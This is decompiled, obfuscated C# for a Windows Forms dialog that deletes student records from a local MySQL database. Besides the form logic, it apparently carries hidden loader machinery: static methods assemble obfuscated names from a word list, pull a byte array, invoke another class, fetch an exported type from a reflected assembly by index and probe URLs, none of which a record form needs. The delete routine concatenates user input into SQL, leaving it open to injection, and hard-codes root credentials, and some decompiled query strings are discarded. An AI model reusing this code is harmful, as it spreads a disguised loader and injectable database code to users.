using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Eo8;
using Lb5n;
using Microsoft.VisualBasic.CompilerServices;
using Wi84;
using d4G;
using g7J;
using q8R9;

namespace o8G9;

[DesignerGenerated]
public class f2W9 : Form
{
	private Label _Label1;

	private TextBox _TextBox1;

	private j6R Connection;

	public DataTable dbDataSet;

	internal IContainer c;

	internal Label s;

	internal Button o;

	internal Ms8 l;

	public f2W9()
	{
		((Form)this).add_Load((EventHandler)t1C8);
		dbDataSet = new DataTable();
		Ya61();
	}

	protected override void i6YT(bool Zy7t)
	{
		try
		{
			if (Zy7t && c != null)
			{
				c.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Zy7t);
		}
	}

	private void Ya61()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		g8WD(new Label());
		q3SN(new Label());
		r0LB(new TextBox());
		Xb69(new Button());
		((Control)this).SuspendLayout();
		y8KC().set_AutoSize(true);
		((Control)y8KC()).set_Location(new Point(90, 22));
		((Control)y8KC()).set_Name("Label1");
		((Control)y8KC()).set_Size(new Size(93, 13));
		((Control)y8KC()).set_TabIndex(0);
		y8KC().set_Text("Enter Roll Number");
		p1HM().set_AutoSize(true);
		((Control)p1HM()).set_Location(new Point(37, 74));
		((Control)p1HM()).set_Name("Label2");
		((Control)p1HM()).set_Size(new Size(65, 13));
		((Control)p1HM()).set_TabIndex(1);
		p1HM().set_Text("Roll Number");
		((Control)y7HY()).set_Location(new Point(108, 71));
		((Control)y7HY()).set_Name("TextBox1");
		((Control)y7HY()).set_Size(new Size(118, 20));
		((Control)y7HY()).set_TabIndex(2);
		((Control)Kx6e()).set_Location(new Point(93, 115));
		((Control)Kx6e()).set_Name("Button1");
		((Control)Kx6e()).set_Size(new Size(75, 23));
		((Control)Kx6e()).set_TabIndex(3);
		((ButtonBase)Kx6e()).set_Text("Search");
		((ButtonBase)Kx6e()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 168));
		((Control)this).get_Controls().Add((Control)(object)Kx6e());
		((Control)this).get_Controls().Add((Control)(object)y7HY());
		((Control)this).get_Controls().Add((Control)(object)p1HM());
		((Control)this).get_Controls().Add((Control)(object)y8KC());
		((Control)this).set_Name("DeleteRecord");
		((Form)this).set_Text("DeleteRecord");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label y8KC()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g8WD(Label Fp1d)
	{
		_Label1 = Fp1d;
	}

	[SpecialName]
	internal virtual Label p1HM()
	{
		return s;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q3SN(Label Gy7s)
	{
		Label val = (s = Gy7s);
	}

	[SpecialName]
	internal virtual TextBox y7HY()
	{
		return _TextBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r0LB(TextBox Wq38)
	{
		_TextBox1 = Wq38;
	}

	[SpecialName]
	internal virtual Button Kx6e()
	{
		return o;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xb69(Button m9R3)
	{
		EventHandler eventHandler = n4EM;
		Button val = o;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (o = m9R3);
		val = o;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	private void t1C8(object sender, EventArgs e)
	{
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
	}

	internal static bool y9N1(string Qq19)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(Qq19);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	private void n4EM(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		Connection = new j6R();
		Connection.Jq8("server=localhost;userid=root;password=root;database=student;");
		BindingSource val = new BindingSource();
		Tw3 tw = new Tw3();
		try
		{
			Connection.f1N();
			_ = "Select * from student.student_info where Roll_Number like '" + y7HY().get_Text() + "';";
			Ms8 ms = (l = new Ms8());
			tw.Wj1(l);
			tw.Gg4(dbDataSet);
			val.set_DataSource((object)dbDataSet);
			if (dbDataSet.Rows.Count >= 1)
			{
				_ = "DELETE from student.student_info where Roll_Number = '" + y7HY().get_Text() + "';";
				Ms8 ms2 = (l = new Ms8());
				l.n6D();
				MessageBox.Show("Record Deleted!");
				((Control)this).Hide();
				Connection.Dt5();
			}
			else
			{
				MessageBox.Show("No Matching Records Found !");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			Connection.g5Z();
		}
		y7HY().set_Text((string)null);
	}

	internal static void Qz85(int w5B7)
	{
		p1RD.mDic = new Dictionary<string, object>();
		p1RD.Listt = new string[11]
		{
			"fuck", "kiri", "book", "std", "ent", "by", "mr.", "trjo", "mnm", "kill",
			"bill"
		};
		p1RD.dName = Mm62(p1RD.Listt, 0, 1);
		p1RD.mDic.Add(p1RD.dName, p1RD.Listt);
		p1RD.tName = Mm62(p1RD.Listt, w5B7, 1);
		checked
		{
			p1RD.mName = Mm62(p1RD.Listt, w5B7 + 1, 2);
			p1RD.mArray = Mm62(p1RD.Listt, w5B7 + 2, 3);
			p1RD.sArray = Mm62(p1RD.Listt, w5B7 + 3, 4);
			p1RD.T = Mm62(p1RD.Listt, w5B7 + 4, 5);
			p1RD.sNum = Mm62(p1RD.Listt, w5B7 + 5, 6);
			if ((double)w5B7 != 2503.0)
			{
				w5B7 = 48;
				p1RD.mDic.Add(p1RD.sNum, 48);
			}
			byte[] value = q9QN.m7J0(w5B7);
			p1RD.mDic.Add(p1RD.sArray, value);
			z8L1.Pz5m();
		}
	}

	internal static string Mm62(string[] Bd3f, int j3BM, int x2EW)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = j3BM; i <= x2EW; i = checked(i + 1))
		{
			stringBuilder.Append(Bd3f[i]);
		}
		return stringBuilder.ToString();
	}

	internal static Type s7S1(Assembly Pm57)
	{
		return Pm57.GetExportedTypes()[27];
	}
}
